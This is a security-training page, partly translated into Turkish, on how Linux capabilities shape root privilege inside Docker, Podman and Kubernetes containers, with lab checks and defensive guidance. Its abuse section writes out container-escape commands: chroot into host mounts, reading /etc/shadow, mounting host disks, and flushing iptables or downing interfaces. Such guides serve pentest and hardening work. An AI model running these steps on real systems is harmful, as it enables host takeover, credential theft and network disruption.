# Konteynerlerde Linux Yetkileri

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

Linux capabilities, konteyner güvenliğinin en önemli parçalarından biridir çünkü ince ama temel bir soruya cevap verir: **konteyner içinde "root" gerçekte ne anlama geliyor?** Normal bir Linux sisteminde, UID 0 tarihsel olarak çok geniş bir ayrıcalık kümesini ima ederdi. Modern çekirdeklerde bu ayrıcalık, capabilities olarak adlandırılan daha küçük birimlere ayrılmıştır. İlgili capabilities kaldırıldıysa, bir proses root olarak çalışıyor olsa bile birçok güçlü işlemi gerçekleştiremeyebilir.

Konteynerler bu ayrımı yoğun şekilde kullanır. Birçok workload hâlâ uyumluluk veya basitlik nedeniyle konteyner içinde UID 0 ile başlatılır. Capability düşürülmemiş olsaydı, bu çok tehlikeli olurdu. Capability düşürme ile konteynerize edilmiş bir root süreci, daha hassas çekirdek işlemlerine engel olunurken yine de birçok sıradan konteyner içi görevi yerine getirebilir. Bu yüzden bir konteyner shell'inin `uid=0(root)` göstermesi otomatik olarak "host root" veya hatta "geniş çekirdek ayrıcalığı" anlamına gelmez. Capability setleri, bu root kimliğinin gerçekte ne kadar değerli olduğunu belirler.

Tam Linux capability referansı ve birçok kötüye kullanım örneği için bakınız:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## İşleyiş

Capabilities birden fazla sette izlenir; bunlar arasında permitted, effective, inheritable, ambient ve bounding setleri bulunur. Birçok konteyner incelemesi için, her setin tam çekirdek semantiği hemen daha az önemli olabilir; asıl pratik soru şudur: **bu proses şu anda hangi ayrıcalıklı işlemleri başarılı şekilde gerçekleştirebiliyor ve hangi gelecekteki ayrıcalık kazanımları hala mümkün?**

Bunun önemi şudur: birçok breakout technique aslında konteyner sorunları olarak kamufle edilmiş capability problemleridir. `CAP_SYS_ADMIN` olan bir workload, normal bir konteyner root sürecinin dokunmaması gereken çok geniş bir çekirdek fonksiyonelliğine erişebilir. `CAP_NET_ADMIN` olan bir workload, host ağ namespace'ini de paylaşıyorsa çok daha tehlikeli hale gelir. `CAP_SYS_PTRACE` olan bir workload, host PID paylaşımıyla host proseslerini görebiliyorsa daha ilginç hale gelir. Docker veya Podman'da bu `--pid=host` olarak görünebilir; Kubernetes'te genellikle `hostPID: true` olarak görünür.

Başka bir deyişle, capability seti izole olarak değerlendirilemez. Namespace'ler, seccomp ve MAC politikası ile birlikte okunmalıdır.

## Lab

Bir konteyner içinde yetkileri incelemenin çok doğrudan bir yolu şudur:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Daha kısıtlayıcı bir container'ı, tüm capabilities'in eklendiği bir container ile de karşılaştırabilirsiniz:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Dar bir eklemenin etkisini görmek için, her şeyi kaldırıp yalnızca tek bir capability eklemeyi deneyin:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
These small experiments help show that a runtime is not simply toggling a boolean called "privileged". It is shaping the actual privilege surface available to the process.

## High-Risk Capabilities

Although many capabilities can matter depending on the target, a few are repeatedly relevant in container escape analysis.

**`CAP_SYS_ADMIN`** is the one defenders should treat with the most suspicion. It is often described as "the new root" because it unlocks an enormous amount of functionality, including mount-related operations, namespace-sensitive behavior, and many kernel paths that should never be casually exposed to containers. If a container has `CAP_SYS_ADMIN`, weak seccomp, and no strong MAC confinement, many classic breakout paths become much more realistic.

**`CAP_SYS_PTRACE`** matters when process visibility exists, especially if the PID namespace is shared with the host or with interesting neighboring workloads. It can turn visibility into tampering.

**`CAP_NET_ADMIN`** and **`CAP_NET_RAW`** matter in network-focused environments. On an isolated bridge network they may already be risky; on a shared host network namespace they are much worse because the workload may be able to reconfigure host networking, sniff, spoof, or interfere with local traffic flows.

**`CAP_SYS_MODULE`** is usually catastrophic in a rootful environment because loading kernel modules is effectively host-kernel control. It should almost never appear in a general-purpose container workload.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O all use capability controls, but the defaults and management interfaces differ. Docker exposes them very directly through flags such as `--cap-drop` and `--cap-add`. Podman exposes similar controls and frequently benefits from rootless execution as an additional safety layer. Kubernetes surfaces capability additions and drops through the Pod or container `securityContext`. System-container environments such as LXC/Incus also rely on capability control, but the broader host integration of those systems often tempts operators into relaxing defaults more aggressively than they would in an app-container environment.

The same principle holds across all of them: a capability that is technically possible to grant is not necessarily one that should be granted. Many real-world incidents begin when an operator adds a capability simply because a workload failed under a stricter configuration and the team needed a quick fix.

## Misconfigurations

The most obvious mistake is **`--cap-add=ALL`** in Docker/Podman-style CLIs, but it is not the only one. In practice, a more common problem is granting one or two extremely powerful capabilities, especially `CAP_SYS_ADMIN`, to "make the application work" without also understanding the namespace, seccomp, and mount implications. Another common failure mode is combining extra capabilities with host namespace sharing. In Docker or Podman this may appear as `--pid=host`, `--network=host`, or `--userns=host`; in Kubernetes the equivalent exposure usually appears through workload settings such as `hostPID: true` or `hostNetwork: true`. Each of those combinations changes what the capability can actually affect.

It is also common to see administrators believe that because a workload is not fully `--privileged`, it is still meaningfully constrained. Sometimes that is true, but sometimes the effective posture is already close enough to privileged that the distinction stops mattering operationally.

## Abuse

The first practical step is to enumerate the effective capability set and immediately test the capability-specific actions that would matter for escape or host information access:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Eğer `CAP_SYS_ADMIN` mevcutsa, öncelikle mount-based abuse ve host filesystem access'i test edin; çünkü bu, breakout'a izin veren en yaygın durumlardan biridir:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Eğer `CAP_SYS_PTRACE` mevcutsa ve container ilginç süreçleri görebiliyorsa, bu capability'nin süreç incelemesine dönüştürülüp dönüştürülemeyeceğini doğrulayın:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Eğer `CAP_NET_ADMIN` veya `CAP_NET_RAW` mevcutsa, iş yükünün görünen ağ yığınını manipüle edip edemeyeceğini veya en azından yararlı ağ istihbaratı toplayıp toplayamayacağını test edin:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Bir capability testi başarılı olduğunda, bunu namespace durumu ile birleştirin. İzole bir namespace'te yalnızca riskli görünen bir capability, container aynı zamanda host PID, host network veya host mounts paylaşıyorsa anında bir escape veya host-recon primitive olabilir.

### Tam Örnek: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Eğer container'da `CAP_SYS_ADMIN` ve `/host` gibi host dosya sisteminin yazılabilir bir bind mount'u varsa, escape yolu genellikle basittir:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Eğer `chroot` başarılı olursa, komutlar artık host kök dosya sistemi bağlamında çalışır:
```bash
id
hostname
cat /etc/shadow | head
```
Eğer `chroot` kullanılamıyorsa, aynı sonuca genellikle binary'yi mount edilmiş ağaç üzerinden çağırarak ulaşılabilir:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Tam Örnek: `CAP_SYS_ADMIN` + Cihaz Erişimi

Eğer host'tan bir block device açığa çıkarıldıysa, `CAP_SYS_ADMIN` bunu doğrudan host dosya sistemi erişimine dönüştürebilir:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Tam Örnek: `CAP_NET_ADMIN` + Host Ağ Modu

Bu kombinasyon her zaman doğrudan host root sağlamaz, ancak host ağ yığınını tamamen yeniden yapılandırabilir:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Bu, denial of service, traffic interception veya önceden filtrelenmiş hizmetlere erişim sağlamaya olanak verebilir.

## Checks

capability kontrollerinin amacı yalnızca ham değerleri dökmek değil, sürecin mevcut namespace ve mount durumunu tehlikeli hale getirecek kadar ayrıcalığa sahip olup olmadığını anlamaktır.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Burada ilginç olanlar:

- `capsh --print` yüksek riskli capabilities (ör. `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, veya `cap_sys_module`) tespit etmenin en kolay yoludur.
- `/proc/self/status` içindeki `CapEff` satırı, diğer setlerde bulunabileceklerden ziyade şu anda gerçekten etkin olanı gösterir.
- Eğer container ayrıca host PID, network veya user namespaces paylaşıyorsa ya da yazılabilir host mount'ları varsa, bir capability dökümü çok daha önemli hale gelir.

Ham capability bilgilerini topladıktan sonra bir sonraki adım yorumlamadır. Process'in root olup olmadığını, user namespaces'in aktif olup olmadığını, host namespaces'in paylaşılıp paylaşılmadığını, seccomp'un enforcing edip etmediğini ve AppArmor veya SELinux'un hâlâ süreci kısıtlayıp kısıtlamadığını sorun. Bir capability seti tek başına hikayenin sadece bir parçasıdır, fakat çoğu zaman bir container breakout'un neden çalıştığını ve aynı görünen başlangıç noktasına sahip başka birinin neden başarısız olduğunu açıklayan parçadır.

## Çalışma Zamanı Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Docker keeps a default allowlist of capabilities and drops the rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Reduced capability set by default | Podman containers are unprivileged by default and use a reduced capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | If no `securityContext.capabilities` are specified, the container gets the default capability set from the runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | The effective set depends on the runtime plus the Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Kubernetes için önemli nokta, API'nin tek bir evrensel varsayılan capability seti tanımlamıyor oluşudur. Eğer Pod capability eklemiyor veya drop etmiyorsa, workload o node için runtime varsayılanını miras alır.
